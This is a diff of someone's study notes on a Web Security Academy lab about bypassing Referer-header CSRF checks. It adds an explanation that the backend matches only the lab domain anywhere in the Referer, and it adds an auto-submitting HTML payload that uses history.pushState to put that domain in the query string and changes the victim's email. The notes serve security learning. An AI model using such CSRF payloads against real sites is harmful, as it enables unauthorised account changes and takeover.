@@ -568,7 +568,9 @@ Testing Referer header for CSRF attacks:
 - we can see that our referer is http://burpsuite/ that is completely different from our domain
 ![[Pasted image 20240925153207.png]]
 
-- we can spoof the referer header or to remove it and if the request is accepted without it we are ready to go 
+- we can spoof the referer header or to remove it and if the request is accepted without it we are ready to go; 
+
+- Payload:
 ```
 <html>
     <head>
@@ -614,3 +616,42 @@ Testing Referer header for CSRF attacks:
 2. Check which portion of the referrer header is the application validating
 
 
+- host != referer when we send the PoC generated exploit
+	![[Pasted image 20240925184921.png]]
+	![[Pasted image 20240925184942.png]]
+	![[Pasted image 20240925184345.png]]
+
+- removing the referer and send the request again in order to see if it is accepted (is not)_
+	![[Pasted image 20240925185052.png]]
+
+- checking which portion of the referrer header is validated in the backend and we observe that if we are changing the first part the request is still accepted --> `LAB-ID.web-security-academy.net` is compared by the backend server
+```
+https://paein-example-domain.com/?LAB-ID.web-security-academy.net`
+```
+
+Note:
+	`/?` - this represents a domain query parameter 
+	![[Pasted image 20240925185342.png]]
+
+- Payload(using the query parameter we append the valid part of the refferer to our url in order to match the original one by the backend):
+```
+<html>
+    <body>
+    
+        <script>
+	        history.pushState('','','/?0a9e0009033f679984f1dd4a00b70051.web-security-academy.net/my-account')
+        </script>
+        
+        <h1>Hello World!</h1>
+        
+        <form action="https://0a9e0009033f679984f1dd4a00b70051.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
+            <input type="hidden" name="email" value="test5@test.ca">
+        </form>
+
+        <script>
+	        document.getElementById("csrf-form").submit()
+	    </script>
+	    
+    </body>
+</html>
+```
